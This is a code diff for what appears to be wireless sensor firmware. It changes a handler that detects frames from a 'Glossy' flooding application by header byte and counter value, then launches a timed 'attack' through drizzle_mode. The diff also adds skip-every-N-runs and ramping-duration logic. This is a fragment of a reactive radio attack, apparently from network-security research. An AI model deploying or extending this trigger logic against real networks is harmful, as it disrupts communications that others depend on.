@@ -737,29 +737,17 @@ ack_mode(int new_mode)
 
 /* ack decision function */
 static int
-ack_should_begin(uint8_t *frame, uint8_t len)
+ack_should_begin(uint8_t *frame, uint8_t len, unsigned long ack_time)
 {
-	/* look for glossy app header */
-	if (frame[0] == 0xA3 && len >= 10) {
-		uint16_t count = frame[8] + frame[9]*256;
-		if (count >= 10 && count <=14) {
-			printf("ack begin: count %u\n", count);
-			return 1;
-		}
-	}
-	return 0;
-}
-
-/* ack decision function */
-static int
-ack_should_end(uint8_t *frame, uint8_t len)
-{
-	/* look for glossy app header */
-	if (frame[0] == 0xA3 && len >= 10) {
-		uint16_t count = frame[8] + frame[9]*256;
-		if (count >= 90 && count <=99) {
-			printf("ack end: count %u\n", count);
-			return 1;
+	/* check minimal ack interval */
+	if (clock_seconds() - ack_time > 15) {
+		/* look for glossy app header */
+		if (frame[0] == 0xA3 && len >= 10) {
+			uint16_t count = frame[8] + frame[9]*256;
+			if (count >= 0 && count <=4) {
+				PRINTF("ack begins at count %u\n", count);
+				return 1;
+			}
 		}
 	}
 	return 0;
@@ -769,20 +757,26 @@ ack_should_end(uint8_t *frame, uint8_t len)
 static void
 ack_handler(uint8_t *frame, uint8_t len)
 {
-	/* printf("ACK pkt size = %u\n", len); */
-	/* static int ack_begun; */
+#define NRUNS 8
+	static unsigned ack_run = 0;
+	static unsigned long ack_time = 0;
 	seqno = 0;
-	/* if (!ack_begun) { */
-		if (ack_should_begin(frame, len)) {
-			/* ack_begun = 1; */
-			/* tx_eth(); */
-			drizzle_mode(DRIZZLE);
+
+
+	if (ack_should_begin(frame, len, ack_time)) {
+		/* skip attack every N runs */
+		if (ack_run % NRUNS == 0) {
+			ack_run++;
+			return;
 		}
-	/* } else { */
-	/* 	if (ack_should_end(frame, len)) { */
-	/* 		ack_begun = 0; */
-	/* 	} */
-	/* } */
+		// ramp up attack duraiton in 2 second steps each run
+		max_tx_packets = ack_run % NRUNS;
+		tx_interval = CLOCK_SECOND * 2;
+		drizzle_mode(DRIZZLE);
+		ack_time = clock_seconds();
+		printf("ack run %u begins at time %lu, to last %u s\n", 
+		       ack_run++, ack_time, max_tx_packets*2);
+	}
 }
 
 static void
